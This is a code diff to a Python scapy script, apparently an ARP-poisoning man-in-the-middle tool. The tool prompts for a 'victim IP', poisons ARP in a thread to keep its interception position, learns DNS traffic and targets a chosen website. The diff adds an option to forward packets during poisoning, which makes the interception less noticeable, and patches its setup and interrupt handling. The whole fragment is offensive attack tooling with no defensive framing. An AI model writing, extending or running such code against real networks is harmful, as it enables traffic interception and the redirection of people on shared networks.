@@ -47,6 +47,13 @@ def parse_args():
         help="Aggressiveness level (1-10, default: 5)"
     )
 
+    parser.add_argument(
+        "-f", "--forward",
+        type=bool,
+        default=True,
+        help="Forwarding packets during ARP poisoning"
+    )
+
     args = parser.parse_args()
 
     if not 1 <= args.aggressiveness <= 10:
@@ -92,13 +99,13 @@ def setup():
                 )
                 silent_thread.start()
 
-            while True:
-                check = input("Detecting hosts silently. Type 'done' to continue.").strip().lower()
-                if check == 'done':
-                    if silent_thread.is_alive():
-                        stop_silent.set()
-                        silent_thread.join()
-                    break
+                while True:
+                    check = input("Detecting hosts silently. Type 'done' to continue.\n").strip().lower()
+                    if check == 'done':
+                        if silent_thread.is_alive():
+                            stop_silent.set()
+                            silent_thread.join()
+                        break
 
             args.target = input("> Input the victim IP address: ").strip()
             while args.target not in targets:
@@ -114,28 +121,38 @@ def setup():
             while not 1 <= args.aggressiveness <= 10:
                 print("! Invalid number. Aggressiveness must be between 1 and 10")
                 args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
+
+            args.forward = input("> Forward packets during ARP poisoning? [y/n] ").strip().lower()
+            if args.forward == "y" or args.forward == "yes":
+                forward = True
+            else:
+                forward = False
         except KeyboardInterrupt:
             print("\nAborted. Exiting...")
-            if silent_thread.is_alive():
-                stop_silent.set()
-                silent_thread.join()
+            try:
+                if silent_thread.is_alive():
+                    stop_silent.set()
+                    silent_thread.join()
+            except UnboundLocalError:
+                pass
             exit(0)
 
     return (
         args.interface,
         args.target,
         args.website,
-        args.aggressiveness
+        args.aggressiveness,
+        forward
     )
 
-def run(iface, victim, site, timer):
+def run(iface, victim, site, timer, forward):
     stop_event = threading.Event()
 
     # Poison ARP in a separate thread (to maintain MitM position)
     arp = ARPPoison(iface, victim, site)
     arp_thread = threading.Thread(
         target=arp.attack,
-        args=(timer, stop_event,)
+        args=(timer, forward, stop_event,)
     )
 
     # Learn DNS in a separate thread
@@ -195,5 +212,5 @@ if __name__ == "__main__":
     scapy.conf.verb = 0
     logging.getLogger("scapy").setLevel(logging.ERROR)
 
-    iface, victim, site, timer = setup()
-    run(iface, victim, site, timer)
+    iface, victim, site, timer, forward = setup()
+    run(iface, victim, site, timer, forward)
